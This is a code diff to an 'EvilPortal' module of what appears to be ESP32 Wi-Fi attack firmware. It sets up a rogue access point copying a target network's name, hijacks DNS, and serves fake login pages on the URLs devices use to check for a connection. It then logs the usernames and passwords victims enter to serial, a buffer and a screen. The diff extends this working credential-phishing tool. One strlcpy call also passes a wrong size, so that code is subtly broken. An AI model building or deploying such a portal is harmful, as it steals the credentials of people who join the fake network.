@@ -1,5 +1,9 @@
 #include "EvilPortal.h"
 
+#ifdef HAS_PSRAM
+  char* index_html = nullptr;
+#endif
+
 AsyncWebServer server(80);
 
 EvilPortal::EvilPortal() {
@@ -14,8 +18,6 @@ void EvilPortal::setup() {
 
   html_files = new LinkedList<String>();
 
-  html_files->add("Back");
-
   #ifdef HAS_SD
     if (sd_obj.supported) {
       sd_obj.listDirToLinkedList(html_files, "/", "html");
@@ -25,9 +27,20 @@ void EvilPortal::setup() {
   #endif
 }
 
+void EvilPortal::cleanup() {
+  this->ap_index = -1;
+
+  #ifdef HAS_PSRAM
+    free(index_html);
+    index_html = nullptr;
+  #endif
+}
+
 bool EvilPortal::begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
-  if (!this->setAP(ssids, access_points))
-    return false;
+  if (!this->has_ap) {
+    if (!this->setAP(ssids, access_points))
+      return false;
+  }
   if (!this->setHtml())
     return false;
     
@@ -45,12 +58,50 @@ String EvilPortal::get_password() {
 }
 
 void EvilPortal::setupServer() {
-  server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
-    request->send_P(200, "text/html", index_html);
-    Serial.println("client connected");
-    #ifdef HAS_SCREEN
-      this->sendToDisplay("Client connected to server");
+  #ifndef HAS_PSRAM
+    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
+      request->send_P(200, "text/html", index_html);
+      Serial.println(F("client connected"));
+      #ifdef HAS_SCREEN
+        this->sendToDisplay(F("Client connected to server"));
+      #endif
+    });
+  #else
+    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
+      request->send(200, "text/html", index_html);
+      Serial.println("client connected");
+      #ifdef HAS_SCREEN
+        this->sendToDisplay(F("Client connected to server"));
+      #endif
+    });
+  #endif
+
+  const char* captiveEndpoints[] = {
+    "/hotspot-detect.html",
+    "/library/test/success.html",
+    "/success.txt",
+    "/generate_204",
+    "/gen_204",
+    "/ncsi.txt",
+    "/connecttest.txt",
+    "/redirect"
+  };
+
+  for (int i = 0; i < sizeof(captiveEndpoints) / sizeof(captiveEndpoints[0]); i++) {
+    
+    #ifndef HAS_PSRAM
+      server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
+        request->send_P(200, "text/html", index_html);
+      });
+    #else
+      server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
+        request->send(200, "text/html", index_html);
+      });
     #endif
+  }
+
+  server.on("/get-ap-name", HTTP_GET, [this](AsyncWebServerRequest *request) {
+    request->send(200, "text/plain", WiFi.softAPSSID());
   });
 
   server.on("/get", HTTP_GET, [this](AsyncWebServerRequest *request) {
@@ -74,13 +125,18 @@ void EvilPortal::setupServer() {
       200, "text/html",
       "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
   });
-  Serial.println("web server up");
 }
 
 void EvilPortal::setHtmlFromSerial() {
   Serial.println("Setting HTML from serial...");
   const char *htmlStr = Serial.readString().c_str();
-  strncpy(index_html, htmlStr, strlen(htmlStr));
+  #ifdef HAS_PSRAM
+    index_html = (char*) ps_malloc(MAX_HTML_SIZE);
+  #endif
+  strlcpy(index_html, htmlStr, strlen(htmlStr));
+  #ifdef HAS_PSRAM
+    index_html[MAX_HTML_SIZE - 1] = '\0';
+  #endif
   this->has_html = true;
   this->using_serial_html = true;
   Serial.println("html set");
@@ -88,10 +144,10 @@ void EvilPortal::setHtmlFromSerial() {
 
 bool EvilPortal::setHtml() {
   if (this->using_serial_html) {
-    Serial.println("html previously set");
+    Serial.println(F("html previously set"));
     return true;
   }
-  Serial.println("Setting HTML...");
+  Serial.println(F("Setting HTML..."));
   #ifdef HAS_SD
     File html_file = sd_obj.getFile("/" + this->target_html_name);
   #else
@@ -100,7 +156,7 @@ bool EvilPortal::setHtml() {
   if (!html_file) {
     #ifdef HAS_SCREEN
       this->sendToDisplay("Could not find /" + this->target_html_name);
-      this->sendToDisplay("Touch to exit...");
+      this->sendToDisplay(F("Touch to exit..."));
     #endif
     Serial.println("Could not find /" + this->target_html_name + ". Use stopscan...");
     return false;
@@ -108,9 +164,9 @@ bool EvilPortal::setHtml() {
   else {
     if (html_file.size() > MAX_HTML_SIZE) {
       #ifdef HAS_SCREEN
-        this->sendToDisplay("The given HTML is too large.");
+        this->sendToDisplay(F("The given HTML is too large."));
         this->sendToDisplay("The Byte limit is " + (String)MAX_HTML_SIZE);
-        this->sendToDisplay("Touch to exit...");
+        this->sendToDisplay(F("Touch to exit..."));
       #endif
       Serial.println("The provided HTML is too large. Byte limit is " + (String)MAX_HTML_SIZE + "\nUse stopscan...");
       return false;
@@ -121,7 +177,13 @@ bool EvilPortal::setHtml() {
       if (isPrintable(c))
         html.concat(c);
     }
-    strncpy(index_html, html.c_str(), strlen(html.c_str()));
+    #ifdef HAS_PSRAM
+      index_html = (char*) ps_malloc(MAX_HTML_SIZE);
+    #endif
+    strlcpy(index_html, html.c_str(), strlen(html.c_str()));
+    #ifdef HAS_PSRAM
+      index_html[MAX_HTML_SIZE - 1] = '\0';
+    #endif
     this->has_html = true;
     Serial.println("html set");
     html_file.close();
@@ -132,11 +194,13 @@ bool EvilPortal::setHtml() {
 
 bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
   // See if there are selected APs first
+  int targ_ap_index = -1;
   String ap_config = "";
   String temp_ap_name = "";
   for (int i = 0; i < access_points->size(); i++) {
     if (access_points->get(i).selected) {
       temp_ap_name = access_points->get(i).essid;
+      targ_ap_index = i;
       break;
     }
   }
@@ -234,6 +298,7 @@ bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_
     strncpy(apName, ap_config.c_str(), MAX_AP_NAME_SIZE);
     this->has_ap = true;
     Serial.println("ap config set");
+    this->ap_index = targ_ap_index;
     return true;
   }
   else
@@ -241,10 +306,24 @@ bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_
 
 }
 
+bool EvilPortal::setAP(String essid) {
+  if (essid == "")
+    return false;
+
+  if (essid.length() > MAX_AP_NAME_SIZE) {
+    return false;
+  }
+
+  strncpy(apName, essid.c_str(), MAX_AP_NAME_SIZE);
+  this->has_ap = true;
+  Serial.println(F("ap config set"));
+  return true;
+}
+
 void EvilPortal::startAP() {
   const IPAddress AP_IP(172, 0, 0, 1);
 
-  Serial.print("starting ap ");
+  Serial.print(F("starting ap "));
   Serial.println(apName);
 
   WiFi.mode(WIFI_AP);
@@ -255,14 +334,19 @@ void EvilPortal::startAP() {
     this->sendToDisplay("AP started");
   #endif
 
-  Serial.print("ap ip address: ");
+  Serial.print(F("ap ip address: "));
   Serial.println(WiFi.softAPIP());
 
   this->setupServer();
 
+  Serial.println(F("Server endpoints configured"));
+
   this->dnsServer.start(53, "*", WiFi.softAPIP());
+  Serial.println(F("DNS Server started"));
   server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
+  Serial.println(F("Captive Portal handler started"));
   server.begin();
+  Serial.println(F("Server started"));
   #ifdef HAS_SCREEN
     this->sendToDisplay("Evil Portal READY");
   #endif
@@ -291,20 +375,29 @@ void EvilPortal::sendToDisplay(String msg) {
 }
 
 void EvilPortal::main(uint8_t scan_mode) {
-  if ((scan_mode == WIFI_SCAN_EVIL_PORTAL) && (this->has_ap) && (this->has_html)){
-    this->dnsServer.processNextRequest();
-    if (this->name_received && this->password_received) {
-      this->name_received = false;
-      this->password_received = false;
-      String logValue1 =
-          "u: " + this->user_name;
-      String logValue2 = "p: " + this->password;
-      String full_string = logValue1 + " " + logValue2 + "\n";
-      Serial.print(full_string);
-      buffer_obj.append(full_string);
-      #ifdef HAS_SCREEN
-        this->sendToDisplay(full_string);
-      #endif
-    }
+  if (scan_mode != WIFI_SCAN_EVIL_PORTAL || !this->has_ap || !this->has_html) {
+    return;
+  }
+
+  this->dnsServer.processNextRequest();
+
+  if (this->name_received && this->password_received) {
+    this->name_received = false;
+    this->password_received = false;
+
+    // Adjust size depending on your max username/password length
+    char line[96];
+
+    // If user_name / password are still Arduino String:
+    snprintf(line, sizeof(line),
+             "u: %s p: %s\n",
+             this->user_name.c_str(),
+             this->password.c_str());
+
+    Serial.print(line);
+    buffer_obj.append(line);
+    #ifdef HAS_SCREEN
+        this->sendToDisplay(line);
+    #endif
   }
 }
